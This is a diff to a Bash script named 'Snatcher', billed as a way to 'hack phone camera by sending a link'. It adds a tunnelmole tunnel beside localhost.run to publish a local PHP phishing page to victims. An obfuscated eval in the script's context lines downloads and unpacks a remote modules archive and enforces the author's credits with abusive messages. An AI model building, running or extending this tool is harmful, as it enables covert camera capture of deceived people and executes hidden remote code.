@@ -2,7 +2,7 @@
 
 ##   Snatcher : 	hack phone camera by sending a link 📸
 ##   Author 	: 	https://t.me/nullxvoid 
-##   Version 	: 	1.0.0
+##   Version 	: 	1.0.1
 
 AUTHOR=$(cat lib/AUTHOR)
 VERSION=$(cat lib/VERSION)
@@ -32,6 +32,12 @@ fi
 z="
 ";nz='khud';Iz='ithu';NBz='[ -d';GBz='tch"';rz=' le ';Mz='.com';JBz='exit';xBz='com/';HCz='oad/';ABz=' cre';Sz='efs/';fz='; th';tBz=' htt';Az='crea';yBz='Anon';CBz=' you';YCz='rf m';mBz='-y >';OBz=' ".M';cBz='ke s';BBz='dits';WCz='2>&1';FCz='es/d';aBz='. ma';Bz='tor=';jz='"\e[';Xz='UTHO';Jz='buse';gBz='apt ';yz=' the';Lz='tent';SCz='.gz ';sz='mada';iBz='all ';wBz='hub.';DCz='r/re';OCz='-zxf';MBz='fi';MCz='z';DBz=' son';PCz=' mod';QCz='ules';CCz='tche';qBz='>&1';dz='= $A';qz=' kar';sBz=' -LO';vz='o no';ECz='leas';gz='en';UBz='tall';kBz='open';Gz='://r';Yz='R)';pBz='ll 2';dBz='ome ';uz='d\nD';Hz='aw.g';oBz='v/nu';mz=' to ';lz='abhi';VBz='ig a';Rz='er/r';QBz='es" ';XBz='equi';Cz='$(cu';cz='or !';YBz='reme';bz='reat';KCz='es.t';XCz='rm -';ZBz='nts.';uBz='ps:/';GCz='ownl';Wz='ib/A';JCz='.0/m';pz='code';Vz='in/l';Oz='n4Yo';Zz='if [';HBz='slee';ACz='4You';RCz='.tar';TCz='> /d';PBz='odul';KBz='else';VCz='ull ';tz='rcho';oz=' se ';Nz='/Ano';hBz='inst';LCz='ar.g';lBz='ssh ';ICz='v1.0';wz='t ch';Fz='ttps';Pz='u/Sn';UCz='ev/n';Qz='atch';jBz='php ';nBz=' /de';LBz=' ""';iz=' -e ';EBz=' of ';Uz='s/ma';rBz='curl';WBz='ll r';fBz='"';az='[ $c';SBz='then';kz='31mK';TBz='"Ins';RBz=']]; ';eBz='time';NCz='tar ';vBz='/git';Ez='sL h';Tz='head';BCz='/Sna';bBz='y ta';IBz='p 3';ez='R ]]';hz='echo';Dz='rl -';Kz='rcon';xz='nage';FBz='a bi';
 eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$dz$Xz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$z$HBz$IBz$z$JBz$z$KBz$z$hz$LBz$z$MBz$z$Zz$NBz$OBz$PBz$QBz$RBz$SBz$z$hz$LBz$z$KBz$z$hz$iz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$z$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$gBz$hBz$iBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$PBz$KCz$LCz$MCz$z$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$XCz$YCz$PBz$KCz$LCz$MCz$z$MBz"
+
+if ! hash tmole > /dev/null 2>&1; then
+  apt install nodejs -y 
+  npm -g install tunnelmole
+fi
+
 
 main(){
   clear
@@ -113,19 +119,20 @@ hosting(){
   printf "\e[32;1mStarting PHP server...\r"
   php -S localhost:8080 -t .site/$website > /dev/null 2>&1 &
   sleep 2
-  #printf "Starting serveo.net...\r"
-#  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
+  printf "Starting tunnelmole...\r"
+  tmole 8080 > .srvlog 2> /dev/null &
+  sleep 3
 #  sleep 10
   printf "Starting localhost.run...\r"
   ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
   sleep 10
-  #link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
+  link=$(grep -o 'https://[-0-9a-z]*\.tunnelmole.net' ".srvlog")
   lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
   rm -rf .lhrlog .srvlog
   echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
-#  echo Serveo.net : $link
+  echo Public Link : $link
   echo ""
-  echo Localhost.run : $lhlink
+  echo Public Link : $lhlink
   echo -e "\nLocalHost  : http://localhost:8080"
   target
 }
